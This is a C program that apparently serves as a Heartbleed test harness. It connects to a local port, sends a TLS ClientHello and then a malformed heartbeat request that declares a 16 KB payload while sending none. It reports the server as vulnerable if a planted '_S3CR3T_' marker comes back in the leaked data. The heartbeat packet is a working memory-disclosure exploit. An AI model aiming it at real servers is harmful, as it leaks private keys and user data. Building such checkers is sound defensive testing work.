#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


#define TLS_1_0 0x01

// connection info
#define ADDR "127.0.0.1"
int PORT = 0;

#define VULN "VULNERABLE\n"
#define NOT_VULN " NOT_VULNERABLE\n"
#define SECRET "_S3CR3T_"

int sockfd = 0;

struct __attribute__((__packed__)) tls_header {
  uint8_t type;
  uint16_t vert;
  uint16_t length;
};

void send_client_hello(char tls_ver) {
  // TLS header ( 5 bytes)
  char payload[] = {0x16,               // Content type (0x16 for handshake)
    0x03, tls_ver,         // TLS Version
    0x00, 0xdc,         // Length
    // Handshake header
    0x01,               // Type (0x01 for ClientHello)
    0x00, 0x00, 0xd8,   // Length
    0x03, tls_ver,         // TLS Version
    // Random (32 byte)
    0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
    0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
    0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
    0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
    0x00,               // Session ID length
    0x00, 0x66,         // Cipher suites length
    // Cipher suites (51 suites)
    0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
    0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
    0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
    0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
    0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
    0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
    0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
    0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
    0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
    0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
    0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
    0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
    0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
    0x01,               // Compression methods length
    0x00,               // Compression method (0x00 for NULL)
    0x00, 0x49,         // Extensions length
    // Extension: ec_point_formats
    0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
    // Extension: elliptic_curves
    0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
    0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
    0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
    0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
    0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
    0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
    // Extension: SessionTicket TLS
    0x00, 0x23, 0x00, 0x00,
    // Extension: Heartbeat
    0x00, 0x0f, 0x00, 0x01, 0x01};

  assert(sockfd != 0);
  send(sockfd, payload, sizeof(payload), 0);
}

void conn() {
  struct sockaddr_in dest;

  if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0 )
  {
    perror("socket");
    exit(-1);
  }

  bzero(&dest, sizeof(dest));
  dest.sin_family = AF_INET;
  dest.sin_port = htons(PORT);
  if ( inet_aton(ADDR, &dest.sin_addr) == 0 )
  {
    perror("inet_aton");
    exit(-1);
  }

  if ( connect(sockfd, (struct sockaddr*)&dest, sizeof(dest)) != 0 )
  {
    perror("connect");
    exit(-1);
  }
}

void send_heartbeat(char tls_ver) {
  char heartbeat[] = {
    0x18,       // Content Type (Heartbeat)
    0x03, tls_ver,  // TLS version
    0x00, 0x03,  // Length
    // Payload
    0x01,       // Type (Request)
    0x40, 0x00  // Payload length
  };
  assert(sockfd != 0);
  send(sockfd, heartbeat, sizeof(heartbeat), 0);
}

uint8_t* rcv_header(struct tls_header* header) {
  if (recv(sockfd, header, sizeof(struct tls_header), 0) < 0) {
    perror("recv");
    exit(-1);
  }
  header->length = ntohs(header->length);
  uint8_t *ptr = malloc(header->length);
  memset(ptr, 0, header->length);

  int length = header->length;
  while(length != 0) {
    ssize_t read_bytes = recv(sockfd, ptr, length, 0);
    if (read_bytes < 0) {
      perror("recv");
      exit(-1);
    }
    length -= read_bytes;
  }
  return ptr;
}

bool rcv_tls_hello() {
  struct tls_header header;
  uint8_t* ptr = rcv_header(&header);
  bool result = false;
  // read header

  if (ptr[0] == 0x0e && header.type == 22) {
    result = true;
  }

  free(ptr);
  return result;
}

bool rcv_hb() {
  struct tls_header header;
  uint8_t* ptr = rcv_header(&header);
  bool terminated = false;

  if (header.type == 24) {
    terminated = true;
    if (header.length > 3) {
      for (int i = 0; i < header.length; i++) {
        if (!strcmp(&ptr[i], SECRET)) {
          printf(VULN);
          goto free_mem;
        }
      }
    }

    printf(NOT_VULN);
  }
free_mem:
  free(ptr);
  return terminated;
}

void quit() {
  printf(VULN);
  exit(-1);
}

int main(int argc, char** argv) {
  if (argc < 2) {
    printf("Usage : %s port\n", argv[0]);
    exit(-1);
  }
  PORT = atoi(argv[1]);
  signal(SIGALRM, quit);
  alarm(1);
  conn();
  send_client_hello(TLS_1_0);
  while(!rcv_tls_hello());
  send_heartbeat(TLS_1_0);
  while(!rcv_hb());
}
